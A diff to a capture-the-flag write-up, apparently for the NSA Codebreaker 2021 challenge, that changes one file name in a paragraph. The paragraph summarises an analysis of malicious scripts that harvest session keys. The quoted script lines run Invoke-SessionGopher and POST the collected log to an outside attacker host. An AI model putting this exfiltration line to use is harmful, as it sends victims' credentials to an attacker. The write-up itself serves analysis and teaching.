@@ -144,7 +144,7 @@ Invoke-SessionGopher
 Start-Sleep 86400
 Invoke-WebRequest -uri http://xqhyg.invalid:8080 -Method Post -Body $global:log
 ```
-After this little rabbit-hole of email analysis turned malware analysis, we have successfully identified two malicious scripts. One that downloads another script and the other that scrapes the machine for session keys and sends it back to the attacker via the POST request in the last line of zdfou.txt. We can now explore another avenue to detect where else the attacker has been in the next task.
+After this little rabbit-hole of email analysis turned malware analysis, we have successfully identified two malicious scripts. One that downloads another script and the other that scrapes the machine for session keys and sends it back to the attacker via the POST request in the last line of zdfou.sh. We can now explore another avenue to detect where else the attacker has been in the next task.
 
 [User's Emails]: https://github.com/colton-gabertan/NSACodeBreaker2021/blob/task03/emails.zip
 [CyberChef]: https://gchq.github.io/CyberChef/
